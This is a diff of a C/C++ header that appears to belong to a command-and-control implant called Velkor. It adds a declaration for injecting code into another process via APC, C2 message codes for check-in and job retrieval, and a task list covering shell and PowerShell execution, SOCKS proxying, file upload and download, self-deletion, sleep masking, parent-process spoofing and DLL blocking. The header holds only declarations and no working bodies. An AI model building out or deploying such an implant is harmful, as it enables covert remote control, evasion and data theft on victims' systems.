@@ -2,6 +2,7 @@
 #define MISC_H
 
 #include <Velkor.h>
+#include <Communication.h>
 
 /*=============[ Auxiliars.cc ]=============*/
 
@@ -36,14 +37,36 @@ PVOID LdrLoadFunc(
     _In_ ULONG FuncName 
 );
 
-template < typename T >
 ULONG HashString(
-    _In_ T      String,
+    _In_ PCHAR  String,
     _In_ SIZE_T Length
 );
 
 ULONG Random32(
 	void
+);
+
+/*! 
+ * @brief
+ * Function to run callback via APC, if BufferSize is passed it will write memory
+ * 
+ * @param ProcessHandle
+ * Handle to target process for run operation
+ * 
+ * @param FunctionPtr
+ * Pointer to function for run via APC Callback
+ * 
+ * @param Parameter
+ * Parameter to function, its optionally
+ * 
+ * @param BufferSize
+ * Size of buffer in the case that is run write memory
+ */
+BOOL CallbackAPC(
+    _In_     HANDLE ProcessHandle,
+    _In_     PVOID  FunctionPtr,
+    _In_opt_ PVOID  Parameter,
+    _In_opt_ SIZE_T BufferSize
 );
 
 /*=============[ Core.cc ]=============*/
@@ -95,5 +118,69 @@ CONSTEXPR ULONG ExpStrA(
 
     return Hash;
 }
+
+/*==============[ TaskManager.cc ]==============*/
+
+EXTERN_C enum {
+    CodeError = 0x100,
+    CodeCheckin,
+    CodeOutput,
+    CodeGetJob,
+    CodeNoJob
+} VK_CODES;
+
+EXTERN_C enum {
+    TaskSleepTime = 0x500,
+    TaskSleepMask,
+    TaskProcess,
+    TaskCmd,
+    TaskPowershell,
+    TaskSocks,
+    TaskSelfDelete,
+    TaskExplorer,
+    TaskUpload,
+    TaskDownload,
+    TaskExitThread,
+    TaskExitProcess,
+    TaskInfo
+} VK_TASKS;
+
+EXTERN_C enum {
+    SubProcessList = 0x70,
+    SubProcessCreate,
+    SubProcessKill,
+    SubProcessPpid,
+    SubProcessBlockDlls
+} SUB_PROCESS;
+
+EXTERN_C enum {
+    SubExplorerList = 0x70,
+    SubExplorerRead,
+    SubExplorerPwd,
+    SubExplorerChangeDir,
+    SubExplorerMove,
+    SubExplorerCopy,
+    SubExplorerDelete,
+    SubExplorerMakeDir
+} SUB_EXPLORER;
+
+typedef struct {
+    ULONG ID;
+    VOID  ( *TaskFunc )( PPARSER );
+} TASK_MGMT, *PTASK_MGMT;
+
+#define TASK_LENGTH 30
+
+namespace Task {
+
+    VOID Dispatcher( VOID );
+    VOID Process( _In_ PPARSER Parser );
+    VOID Explorer( _In_ PPARSER Parser );
+    VOID SleepMask( _In_ PPARSER Parser );
+    VOID SleepTime( _In_ PPARSER Parser );
+    VOID GetInfo( _In_ PPARSER Parser );
+    
+}
+
 
 #endif // MISC_H
